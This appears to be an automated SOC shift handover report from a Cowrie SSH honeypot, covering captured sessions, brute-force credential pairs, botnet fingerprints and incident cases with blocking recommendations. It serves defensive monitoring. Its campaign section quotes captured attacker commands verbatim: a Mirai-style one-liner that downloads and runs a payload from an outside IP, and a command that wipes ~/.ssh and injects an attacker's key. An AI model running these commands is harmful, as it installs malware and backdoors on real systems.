# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-24 |
| **Generated At** | 2026-08-24T10:42:12Z |
| **Shift Time** | 10:42 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **166** |
| Confirmed Threats | **150** |
| False Positives Filtered | **16** (9.6%) |
| Unique Attacker IPs | **77** |
| Countries of Origin | **29** |
| High Severity Cases | **77** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **89** |
| Malware Samples Analyzed | **2** HIGH · **19** MED · 23 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **102** |
| Unique Credential Pairs | **52** |
| Unique Usernames | **18** |
| Unique Passwords | **48** |
| Successful Auth Pairs | **87** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 22 |
| `ubuntu` | 11 |
| `admin` | 10 |
| `test` | 9 |
| `guest` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 6 |
| `abcd1234` | 6 |
| `supervisor2022` | 5 |
| `password321` | 5 |
| `test2022` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `default` | `abcd1234` | 6 |
| `supervisor` | `supervisor2022` | 5 |
| `unknown` | `password321` | 5 |
| `admin` | `admin` | 5 |
| `test` | `test2022` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `operator` | `operator2002` | `203.75.170.63` | 2026-08-24T06:55:22 |
| `operator` | `operator2002` | `210.0.90.82` | 2026-08-24T06:55:31 |
| `support` | `support` | `176.53.159.196` | 2026-08-24T06:59:04 |
| `supervisor` | `supervisor2022` | `65.20.165.151` | 2026-08-24T07:00:16 |
| `supervisor` | `supervisor2022` | `117.191.83.250` | 2026-08-24T07:00:25 |
| `ubuntu` | `root123!@#` | `217.60.255.130` | 2026-08-24T07:04:18 |
| `root` | `QWERTYUIOP123456` | `217.60.255.130` | 2026-08-24T07:04:22 |
| `guest` | `guest2010` | `2.180.11.118` | 2026-08-24T07:04:56 |
| `guest` | `guest2010` | `177.174.0.3` | 2026-08-24T07:05:04 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-24T07:06:59 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-24T07:06:59 |
| `test` | `test2021` | `10.0.0.73` | 2026-08-24T07:07:52 |
| `bitwarden` | `root` | `120.48.90.166` | 2026-08-24T07:08:08 |
| `test` | `test2021` | `75.80.65.214` | 2026-08-24T07:09:22 |
| `test` | `test2021` | `172.90.128.97` | 2026-08-24T07:09:29 |
| `supervisor` | `supervisor2022` | `10.0.0.73` | 2026-08-24T07:11:17 |
| `ubuntu` | `zabbix123!` | `217.60.255.130` | 2026-08-24T07:13:55 |
| `root` | `Aa321` | `217.60.255.130` | 2026-08-24T07:13:59 |
| `unknown` | `password321` | `10.0.0.73` | 2026-08-24T07:19:39 |
| `support` | `support` | `10.0.0.73` | 2026-08-24T07:22:44 |
| `ubuntu` | `ironman` | `217.60.255.130` | 2026-08-24T07:23:30 |
| `root` | `1qaz!QAZ1qaz` | `217.60.255.130` | 2026-08-24T07:23:33 |
| `admin` | `admin` | `186.242.162.94` | 2026-08-24T07:24:42 |
| `supervisor` | `supervisor2022` | `81.214.75.248` | 2026-08-24T07:27:48 |
| `ubuntu` | `1234abc` | `217.60.255.130` | 2026-08-24T07:33:08 |
| `root` | `Alireza123` | `217.60.255.130` | 2026-08-24T07:33:11 |
| `unknown` | `password321` | `35.130.111.146` | 2026-08-24T07:37:17 |
| `unknown` | `password321` | `49.124.153.14` | 2026-08-24T07:37:33 |
| `unknown` | `password321` | `65.20.217.64` | 2026-08-24T07:37:41 |
| `default` | `abcd1234` | `10.0.0.73` | 2026-08-24T07:40:20 |
| `default` | `abcd1234` | `78.187.9.53` | 2026-08-24T07:41:51 |
| `default` | `abcd1234` | `118.163.145.175` | 2026-08-24T07:42:04 |
| `user` | `user2023` | `10.0.0.73` | 2026-08-24T07:43:43 |
| `root` | `admin` | `45.198.224.26` | 2026-08-24T07:45:22 |
| `ubuntu` | `Telecom123` | `217.60.255.130` | 2026-08-24T07:45:59 |
| `root` | `ubuntu@123` | `217.60.255.130` | 2026-08-24T07:46:02 |
| `frontend` | `12345678` | `106.13.46.38` | 2026-08-24T07:49:39 |
| `345gs5662d34` | `345gs5662d34` | `106.13.46.38` | 2026-08-24T07:49:43 |
| `frontend` | `3245gs5662d34` | `106.13.46.38` | 2026-08-24T07:49:45 |
| `admin` | `admin` | `85.239.149.72` | 2026-08-24T07:49:58 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-24T07:49:58 |
| `root` | `root2003` | `10.0.0.73` | 2026-08-24T07:52:23 |
| `dockeruser` | `123456` | `103.188.177.46` | 2026-08-24T07:52:36 |
| `345gs5662d34` | `345gs5662d34` | `103.188.177.46` | 2026-08-24T07:52:41 |
| `dockeruser` | `3245gs5662d34` | `103.188.177.46` | 2026-08-24T07:52:42 |
| `default` | `abcd1234` | `106.70.0.181` | 2026-08-24T07:57:13 |
| `default` | `abcd1234` | `182.75.197.174` | 2026-08-24T07:57:23 |
| `ubuntu` | `passw0rd6` | `217.60.255.130` | 2026-08-24T07:58:57 |
| `root` | `P@ssw0rd2` | `217.60.255.130` | 2026-08-24T07:59:03 |
| `user` | `user2023` | `112.25.140.211` | 2026-08-24T08:00:07 |
| `user` | `user2023` | `35.130.111.98` | 2026-08-24T08:00:15 |
| `test` | `test2022` | `91.219.196.17` | 2026-08-24T08:05:13 |
| `ubuntu` | `!2#4%6&8` | `217.60.255.130` | 2026-08-24T08:09:45 |
| `root` | `Navid@123` | `217.60.255.130` | 2026-08-24T08:09:51 |
| `root` | `root2003` | `117.204.1.45` | 2026-08-24T08:10:18 |
| `root` | `root2003` | `176.103.15.75` | 2026-08-24T08:10:18 |
| `guest` | `guest12345678` | `10.0.0.73` | 2026-08-24T08:12:58 |
| `test` | `test2022` | `10.0.0.73` | 2026-08-24T08:16:16 |
| `root` | `Lx123456` | `131.161.249.165` | 2026-08-24T08:16:25 |
| `345gs5662d34` | `345gs5662d34` | `131.161.249.165` | 2026-08-24T08:16:28 |
| `root` | `3245gs5662d34` | `131.161.249.165` | 2026-08-24T08:16:29 |
| `ubuntu` | `Admin.123` | `217.60.255.130` | 2026-08-24T08:19:37 |
| `root` | `tic@123` | `217.60.255.130` | 2026-08-24T08:19:40 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `64.62.156.202` | 2026-08-24T08:20:22 |
| `admin` | `admin12345678` | `10.0.0.73` | 2026-08-24T08:25:10 |
| `ftpuser` | `asd123` | `182.171.90.17` | 2026-08-24T08:28:40 |
| `345gs5662d34` | `345gs5662d34` | `182.171.90.17` | 2026-08-24T08:28:44 |
| `ftpuser` | `3245gs5662d34` | `182.171.90.17` | 2026-08-24T08:28:45 |
| `ubuntu` | `qwe123!@#` | `217.60.255.130` | 2026-08-24T08:29:07 |
| `root` | `Navid123` | `217.60.255.130` | 2026-08-24T08:29:12 |
| `guest` | `guest12345678` | `103.7.60.253` | 2026-08-24T08:29:55 |
| `guest` | `guest12345678` | `111.70.23.238` | 2026-08-24T08:30:04 |
| `test` | `test2022` | `49.124.151.6` | 2026-08-24T08:32:43 |
| `test` | `test2022` | `43.245.85.2` | 2026-08-24T08:32:52 |
| `ubuntu` | `nexus2025` | `217.60.255.130` | 2026-08-24T08:38:51 |
| `root` | `Diba@123` | `217.60.255.130` | 2026-08-24T08:38:55 |
| `admin` | `admin12345678` | `187.8.3.230` | 2026-08-24T08:42:47 |
| `admin` | `admin12345678` | `219.143.40.210` | 2026-08-24T08:42:56 |
| `admin` | `admin12345678` | `85.229.6.228` | 2026-08-24T08:42:58 |
| `admin` | `admin12345678` | `59.34.17.130` | 2026-08-24T08:43:06 |
| `blank` | `blank2020` | `10.0.0.73` | 2026-08-24T08:45:19 |
| `blank` | `blank2020` | `31.59.89.50` | 2026-08-24T08:46:51 |
| `blank` | `blank2020` | `211.22.222.251` | 2026-08-24T08:47:01 |
| `admin` | `admin` | `47.254.80.91` | 2026-08-24T08:47:50 |
| `ubuntu` | `localadmin` | `217.60.255.130` | 2026-08-24T08:48:39 |
| `guest` | `qwerty123456` | `10.0.0.73` | 2026-08-24T08:48:40 |
| `root` | `aA123456` | `217.60.255.130` | 2026-08-24T08:48:42 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **166** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 50 |
| OpenSSH | 34 |
| Go SSH scanner | 9 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 34 | 34 |
| `419da4c91ddb...` | Modern SSH client | 22 | 1 |
| `f555226df196...` | Mirai/variant | 13 | 5 |
| `16443846184e...` | Generic scanner | 4 | 2 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 34 | 34 | Mirai/variant |
| `419da4c91ddb...` | libssh | 22 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 13 | 7 | — |
| `f555226df196...` | libssh | 13 | 5 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 4 | 2 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 2 | 1 | Mirai/variant |
| `19532158b559...` | libssh | 2 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1070, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
```
```
cd /tmp
```
```
wget http://5.182.210.174/ok
```
```
curl -O http://5.182.210.174/ok
```
```
chmod +x ok
```
Source IPs: `45.198.224.26`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `106.13.46.38`, `182.171.90.17`, `131.161.249.165`, `103.188.177.46`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **77** |
| Unique ASNs | **57** |
| High-Risk ASNs | **51** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 4 | HIGH |
| `AS58224` | Iran Telecommunication Company PJS | 3 | HIGH |
| `AS3462` | Data Communication Business Group | 3 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 3 | HIGH |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS20115` | Charter Communications LLC | 2 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (77)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-cd6889630589

| Field | Detail |
|---|---|
| **Source IP** | `203.75.170[.]63` |
| **First Seen** | 2026-08-24 06:55 |
| **Last Seen** | 2026-08-24 06:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:55:19` | `cowrie.session.connect` |
| `2026-08-24 06:55:19` | `cowrie.client.version` |
| `2026-08-24 06:55:19` | `cowrie.client.kex` |
| `2026-08-24 06:55:22` | `cowrie.login.success` |
| `2026-08-24 06:55:22` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:55:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.75.170[.]63` to AbuseIPDB if not already reported
- [ ] Block `203.75.170[.]63` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-638755c1d15f

| Field | Detail |
|---|---|
| **Source IP** | `210.0.90[.]82` |
| **First Seen** | 2026-08-24 06:55 |
| **Last Seen** | 2026-08-24 06:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:55:28` | `cowrie.session.connect` |
| `2026-08-24 06:55:28` | `cowrie.client.version` |
| `2026-08-24 06:55:28` | `cowrie.client.kex` |
| `2026-08-24 06:55:31` | `cowrie.login.success` |
| `2026-08-24 06:55:32` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:55:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.0.90[.]82` to AbuseIPDB if not already reported
- [ ] Block `210.0.90[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c74a61d37260

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-24 06:59 |
| **Last Seen** | 2026-08-24 06:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:59:03` | `cowrie.session.connect` |
| `2026-08-24 06:59:03` | `cowrie.client.version` |
| `2026-08-24 06:59:03` | `cowrie.client.kex` |
| `2026-08-24 06:59:04` | `cowrie.login.success` |
| `2026-08-24 06:59:04` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:59:04` | `cowrie.direct-tcpip.data` |
| `2026-08-24 06:59:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4135a9a36d32

| Field | Detail |
|---|---|
| **Source IP** | `65.20.165[.]151` |
| **First Seen** | 2026-08-24 07:00 |
| **Last Seen** | 2026-08-24 07:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:00:14` | `cowrie.session.connect` |
| `2026-08-24 07:00:14` | `cowrie.client.version` |
| `2026-08-24 07:00:14` | `cowrie.client.kex` |
| `2026-08-24 07:00:16` | `cowrie.login.success` |
| `2026-08-24 07:00:16` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:00:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.165[.]151` to AbuseIPDB if not already reported
- [ ] Block `65.20.165[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1fd90e26b3a

| Field | Detail |
|---|---|
| **Source IP** | `117.191.83[.]250` |
| **First Seen** | 2026-08-24 07:00 |
| **Last Seen** | 2026-08-24 07:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:00:22` | `cowrie.session.connect` |
| `2026-08-24 07:00:23` | `cowrie.client.version` |
| `2026-08-24 07:00:23` | `cowrie.client.kex` |
| `2026-08-24 07:00:25` | `cowrie.login.success` |
| `2026-08-24 07:00:26` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:00:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.191.83[.]250` to AbuseIPDB if not already reported
- [ ] Block `117.191.83[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4297829d744e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 07:04 |
| **Last Seen** | 2026-08-24 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:04:17` | `cowrie.session.connect` |
| `2026-08-24 07:04:17` | `cowrie.client.version` |
| `2026-08-24 07:04:17` | `cowrie.client.kex` |
| `2026-08-24 07:04:18` | `cowrie.login.success` |
| `2026-08-24 07:04:18` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:04:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 07:04:18` | `cowrie.direct-tcpip.data` |
| `2026-08-24 07:04:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a1b7de06bb0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 07:04 |
| **Last Seen** | 2026-08-24 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:04:21` | `cowrie.session.connect` |
| `2026-08-24 07:04:21` | `cowrie.client.version` |
| `2026-08-24 07:04:21` | `cowrie.client.kex` |
| `2026-08-24 07:04:22` | `cowrie.login.success` |
| `2026-08-24 07:04:22` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:04:22` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 07:04:22` | `cowrie.direct-tcpip.data` |
| `2026-08-24 07:04:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efca245fda6d

| Field | Detail |
|---|---|
| **Source IP** | `2.180.11[.]118` |
| **First Seen** | 2026-08-24 07:04 |
| **Last Seen** | 2026-08-24 07:05 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:04:50` | `cowrie.session.connect` |
| `2026-08-24 07:04:52` | `cowrie.client.version` |
| `2026-08-24 07:04:52` | `cowrie.client.kex` |
| `2026-08-24 07:04:56` | `cowrie.login.success` |
| `2026-08-24 07:04:57` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:05:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.180.11[.]118` to AbuseIPDB if not already reported
- [ ] Block `2.180.11[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a654cf0bd1f

| Field | Detail |
|---|---|
| **Source IP** | `177.174.0[.]3` |
| **First Seen** | 2026-08-24 07:05 |
| **Last Seen** | 2026-08-24 07:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:05:01` | `cowrie.session.connect` |
| `2026-08-24 07:05:02` | `cowrie.client.version` |
| `2026-08-24 07:05:02` | `cowrie.client.kex` |
| `2026-08-24 07:05:04` | `cowrie.login.success` |
| `2026-08-24 07:05:05` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:05:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.0[.]3` to AbuseIPDB if not already reported
- [ ] Block `177.174.0[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db59b2b89c9a

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-24 07:06 |
| **Last Seen** | 2026-08-24 07:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:06:58` | `cowrie.session.connect` |
| `2026-08-24 07:06:58` | `cowrie.client.version` |
| `2026-08-24 07:06:58` | `cowrie.client.kex` |
| `2026-08-24 07:06:59` | `cowrie.login.success` |
| `2026-08-24 07:06:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-711d7a88c7f5

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-24 07:06 |
| **Last Seen** | 2026-08-24 07:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:06:58` | `cowrie.session.connect` |
| `2026-08-24 07:06:58` | `cowrie.client.version` |
| `2026-08-24 07:06:58` | `cowrie.client.kex` |
| `2026-08-24 07:06:59` | `cowrie.login.success` |
| `2026-08-24 07:06:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-764fc2220eb8

| Field | Detail |
|---|---|
| **Source IP** | `120.48.90[.]166` |
| **First Seen** | 2026-08-24 07:08 |
| **Last Seen** | 2026-08-24 07:08 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:08:04` | `cowrie.session.connect` |
| `2026-08-24 07:08:06` | `cowrie.client.version` |
| `2026-08-24 07:08:06` | `cowrie.client.kex` |
| `2026-08-24 07:08:08` | `cowrie.login.success` |
| `2026-08-24 07:08:09` | `cowrie.session.params` |
| `2026-08-24 07:08:09` | `cowrie.command.input` |
| `2026-08-24 07:08:09` | `cowrie.command.failed` |
| `2026-08-24 07:08:12` | `cowrie.log.closed` |
| `2026-08-24 07:08:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `120.48.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f18f43e3fe8

| Field | Detail |
|---|---|
| **Source IP** | `75.80.65[.]214` |
| **First Seen** | 2026-08-24 07:09 |
| **Last Seen** | 2026-08-24 07:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:09:20` | `cowrie.session.connect` |
| `2026-08-24 07:09:21` | `cowrie.client.version` |
| `2026-08-24 07:09:21` | `cowrie.client.kex` |
| `2026-08-24 07:09:22` | `cowrie.login.success` |
| `2026-08-24 07:09:23` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:09:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `75.80.65[.]214` to AbuseIPDB if not already reported
- [ ] Block `75.80.65[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-539478a1a423

| Field | Detail |
|---|---|
| **Source IP** | `172.90.128[.]97` |
| **First Seen** | 2026-08-24 07:09 |
| **Last Seen** | 2026-08-24 07:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:09:28` | `cowrie.session.connect` |
| `2026-08-24 07:09:28` | `cowrie.client.version` |
| `2026-08-24 07:09:28` | `cowrie.client.kex` |
| `2026-08-24 07:09:29` | `cowrie.login.success` |
| `2026-08-24 07:09:30` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:09:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.90.128[.]97` to AbuseIPDB if not already reported
- [ ] Block `172.90.128[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6a620a3897f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 07:13 |
| **Last Seen** | 2026-08-24 07:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
